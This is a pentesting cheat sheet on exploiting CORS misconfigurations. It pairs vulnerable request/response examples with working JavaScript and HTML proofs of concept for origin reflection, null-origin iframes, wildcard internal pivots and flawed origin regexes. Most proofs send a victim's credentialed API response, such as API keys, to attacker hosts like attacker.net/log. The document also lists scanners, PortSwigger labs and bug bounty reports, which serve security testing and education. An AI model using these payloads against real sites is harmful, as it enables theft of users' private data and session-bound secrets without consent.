# cors misconfiguration

> a site-wide cors misconfiguration was in place for an api domain. this allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the origin header and had access-control-allow-credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials. 


## summary

* [tools](#tools)
* [requirements](#requirements)
* [methodology](#methodology)
    * [origin reflection](#origin-reflection)
    * [null origin](#null-origin)
    * [xss on trusted origin](#xss-on-trusted-origin)
    * [wildcard origin without credentials](#wildcard-origin-without-credentials)
    * [expanding the origin](#expanding-the-origin)
* [labs](#labs)
* [references](#references)


## tools

* [s0md3v/corsy](https://github.com/s0md3v/corsy/) - cors misconfiguration scanner
* [chenjj/corscanner](https://github.com/chenjj/corscanner) - fast cors misconfiguration vulnerabilities scanner
* [@honoki/postmessage](https://tools.honoki.net/postmessage.html) - poc builder
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - exploit cors misconfigurations on the internal networks
* [omranisecurity/corsone](https://github.com/omranisecurity/corsone) - fast cors misconfiguration discovery tool


## requirements

* burp header> `origin: https://evil.com`
* victim header> `access-control-allow-credential: true`
* victim header> `access-control-allow-origin: https://evil.com` or `access-control-allow-origin: null`


## methodology

usually you want to target an api endpoint. use the following payload to exploit a cors misconfiguration on target `https://victim.example.com/endpoint`.

### origin reflection

#### vulnerable implementation

```powershell
get /endpoint http/1.1
host: victim.example.com
origin: https://evil.com
cookie: sessionid=... 

http/1.1 200 ok
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true 

{"[private api key]"}
```

#### proof of concept

this poc requires that the respective js script is hosted at `evil.com`

```js
var req = new xmlhttprequest(); 
req.onload = reqlistener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withcredentials = true;
req.send();

function reqlistener() {
    location='//attacker.net/log?key='+this.responsetext; 
};
```

or 

```html
<html>
     <body>
         <h2>cors poc</h2>
         <div id="demo">
             <button type="button" onclick="cors()">exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new xmlhttprequest();
             xhr.onreadystatechange = function() {
                 if (this.readystate == 4 && this.status == 200) {
                 document.getelementbyid("demo").innerhtml = alert(this.responsetext);
                 }
             };
              xhr.open("get",
                       "https://victim.example.com/endpoint", true);
             xhr.withcredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### null origin

#### vulnerable implementation

it's possible that the server does not reflect the complete `origin` header but
that the `null` origin is allowed. this would look like this in the server's
response:

```
get /endpoint http/1.1
host: victim.example.com
origin: null
cookie: sessionid=... 

http/1.1 200 ok
access-control-allow-origin: null
access-control-allow-credentials: true 

{"[private api key]"}
```

#### proof of concept

this can be exploited by putting the attack code into an iframe using the data
uri scheme. if the data uri scheme is used, the browser will use the `null`
origin in the request:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new xmlhttprequest();
  req.onload = reqlistener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withcredentials = true;
  req.send();

  function reqlistener() {
    location='https://attacker.example.net/log?key='+encodeuricomponent(this.responsetext);
   };
</script>"></iframe> 
```

### xss on trusted origin

if the application does implement a strict whitelist of allowed origins, the
exploit codes from above do not work. but if you have an xss on a trusted
origin, you can inject the exploit coded from above in order to exploit cors
again.

```
https://trusted-origin.example.com/?xss=<script>cors-attack-payload</script>
```

### wildcard origin without credentials

if the server responds with a wildcard origin `*`, **the browser does never send
the cookies**. however, if the server does not require authentication, it's still
possible to access the data on the server. this can happen on internal servers
that are not accessible from the internet. the attacker's website can then 
pivot into the internal network and access the server's data without authentication.

```powershell
* is the only wildcard origin
https://*.example.com is not valid
```

#### vulnerable implementation

```powershell
get /endpoint http/1.1
host: api.internal.example.com
origin: https://evil.com

http/1.1 200 ok
access-control-allow-origin: *

{"[private api key]"}
```

#### proof of concept

```js
var req = new xmlhttprequest(); 
req.onload = reqlistener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqlistener() {
    location='//attacker.net/log?key='+this.responsetext; 
};
```


### expanding the origin

occasionally, certain expansions of the original origin are not filtered on the server side. this might be caused by using a badly implemented regular expressions to validate the origin header.

#### vulnerable implementation (example 1)

in this scenario any prefix inserted in front of `example.com` will be accepted by the server. 

```
get /endpoint http/1.1
host: api.example.com
origin: https://evilexample.com

http/1.1 200 ok
access-control-allow-origin: https://evilexample.com
access-control-allow-credentials: true 

{"[private api key]"}

```

#### proof of concept (example 1)

this poc requires the respective js script to be hosted at `evilexample.com`

```js
var req = new xmlhttprequest(); 
req.onload = reqlistener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withcredentials = true;
req.send();

function reqlistener() {
    location='//attacker.net/log?key='+this.responsetext; 
};
```

#### vulnerable implementation (example 2)

in this scenario the server utilizes a regex where the dot was not escaped correctly. for instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. thus, the dot can be replaced with any letter to gain access from a third-party domain.

```
get /endpoint http/1.1
host: api.example.com
origin: https://apiiexample.com

http/1.1 200 ok
access-control-allow-origin: https://apiiexample.com
access-control-allow-credentials: true 

{"[private api key]"}

```

#### proof of concept (example 2)

this poc requires the respective js script to be hosted at `apiiexample.com`

```js
var req = new xmlhttprequest(); 
req.onload = reqlistener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withcredentials = true;
req.send();

function reqlistener() {
    location='//attacker.net/log?key='+this.responsetext; 
};
```


## labs

* [portswigger - cors vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [portswigger - cors vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [portswigger - cors vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [portswigger - cors vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)


## references

- [[██████] cross-origin resource sharing misconfiguration (cors) - vadim (jarvis7) - december 20, 2018](https://hackerone.com/reports/470298)
- [advanced cors exploitation techniques - corben leo - june 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
- [cors misconfig | account takeover - rohan (nahoragg) - october 20, 2018](https://hackerone.com/reports/426147)
- [cors misconfiguration leading to private information disclosure - sandh0t (sandh0t) - october 29, 2018](https://hackerone.com/reports/430249)
- [cors misconfiguration on www.zomato.com - james kettle (albinowax) - september 15, 2016](https://hackerone.com/reports/168574)
- [cors misconfigurations explained - detectify blog - april 26, 2018](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
- [cross-origin resource sharing (cors) - portswigger web security academy - december 30, 2019](https://portswigger.net/web-security/cors)
- [cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - june 1, 2017](https://hackerone.com/reports/235200)
- [exploiting cors misconfigurations for bitcoins and bounties - james kettle - 14 october 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [exploiting misconfigured cors (cross origin resource sharing) - geekboy - december 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
- [think outside the scope: advanced cors exploitation techniques - ayoub safa (sandh0t) - may 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)